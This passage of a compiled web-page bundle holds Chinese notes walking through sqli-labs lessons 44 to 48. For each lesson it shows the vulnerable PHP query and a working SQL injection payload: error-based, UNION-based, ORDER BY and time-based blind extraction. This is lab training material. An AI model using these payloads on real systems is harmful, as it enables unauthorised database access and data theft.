password=('$password')\";\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408\u65b9\u5f0f",(0,l.jsx)(r.code,{children:"')"})]}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"login_user=admin&login_password=1')+-+updatexml(1,concat(0x7e,user()),1)+-('\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-44",children:"less-44"}),"\n",(0,l.jsx)(r.p,{children:"\u5c11\u4e86\u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";\n"})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"login_user=admin&login_password=1'+union+select+1,database(),3--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-45",children:"less-45"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"$sql = \"SELECT * FROM users WHERE username=('$username') and password=('$password')\";\n"})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"login_user=admin&login_password=1')+union+select+1,database(),3--+&mysubmit=Login\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-46-order-by\u6ce8\u5165",children:"less-46 Order-By\u6ce8\u5165"}),"\n",(0,l.jsxs)(r.blockquote,{children:["\n",(0,l.jsxs)(r.p,{children:["order by \u6ce8\u5165\u662f",(0,l.jsx)(r.code,{children:"SQL"}),"\u6ce8\u5165\u4e2d\u5f88\u5e38\u89c1\u7684\uff0c\u88ab\u8fc7\u6ee4\u7684\u6982\u7387\u5c0f\uff1b"]}),"\n",(0,l.jsx)(r.p,{children:"\u53ef\u88ab\u7528\u6237\u63a7\u5236\u7684\u6570\u636e\u5728order by \u5b50\u53e5\u540e\u8fb9\uff0c\u5373order\u53c2\u6570\u53ef\u63a7"}),"\n",(0,l.jsxs)(r.p,{children:[(0,l.jsx)(r.strong,{children:"\u5347\u5e8f\u6392\u5e8f"}),"\uff08\u9ed8\u8ba4\uff09\uff1a\u4f7f\u7528 ",(0,l.jsx)(r.code,{children:"ORDER BY column_name ASC"}),"\uff0c\u6216\u8005\u7b80\u5355\u5730 ",(0,l.jsx)(r.code,{children:"ORDER BY column_name"}),"\u3002"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"sql\r\nSELECT * FROM users ORDER BY last_name;\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u8fd9\u5c06\u6839\u636e ",(0,l.jsx)(r.code,{children:"last_name"})," \u5217\u5bf9\u7528\u6237\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\u3002"]}),"\n"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'$sql = "SELECT * FROM users ORDER BY $id";\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u4e0d\u80fd\u4f7f\u7528union,\u4f7f\u7528\u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"updatexml(1,concat(0x7e,(select+username+from+users+limit+3,1)),1)\r\nextractvalue(1,concat(0x7e,(select+username+from+users+limit+3,1)))\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-47",children:"less-47"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"$sql = \"SELECT * FROM users ORDER BY '$id'\";\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u5355\u5f15\u53f7\u95ed\u5408"}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1'+and+extractvalue(1,concat(0x7e,(select+username+from+users+limit+3,1)))-'\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-48",children:"less-48"}),"\n",(0,l.jsx)(r.p,{children:"\u62a5\u9519\u6ce8\u5165\u6ca1\u4e86"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'$sql = "SELECT * FROM users ORDER BY $id";\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u4f7f\u7528\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"rand () \u9a8c\u8bc1\r\nrand (ture) \u548c rand (false) \u7684\u7ed3\u679c\u662f\u4e0d\u4e00\u6837\u7684\r\n\r\n?sort=rand(true)\r\n?sort=rand(false)\r\n\u6240\u4ee5\u5229\u7528\u8fd9\u4e2a\u53ef\u4ee5\u8f7b\u6613\u6784\u9020\u51fa\u4e00\u4e2a\u5e03\u5c14\u548c\u5ef6\u65f6\u7c7b\u578b\u76f2\u6ce8\u7684\u6d4b\u8bd5 payload\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"rand(ascii(left(database(),1))=115)\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u663e\u793a\u4e0d\u4e00\u6837"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241210193510375.png",alt:"image-20241210193510375"})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241210193528529.png",alt:"image-20241210193528529"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))\r\n?sort=rand(if(ascii(substr(database(),1,1))>115,1,sleep(1)))\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u6570\u636e\u5e93\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u7684 ascii \u7801\u4e3a 115\uff0c\u5373 ",(0,l.jsx)(r.code,{children:"s"}),"\uff0c114\u4e0d\u5ef6\u65f6\uff0c115\u5ef6\u65f6"]})]})}function h(e={}){const{wrapper:r}={...(0,c.R)(),...e.components};return r?(0,l.jsx)(r,{...e,children:(0,l.jsx)(t,{...e})}):t(e)}},28453:(e,r,n)=>{n.d(r,{R:()=>i,x:()=>a});var s=n(96540);const l={},c=s.createContext(l);function i(e){const r=s.useContext(c);return s.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function a(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:i(e.components),s.createElement(c.Provider,{value:r},e.children)}}}]);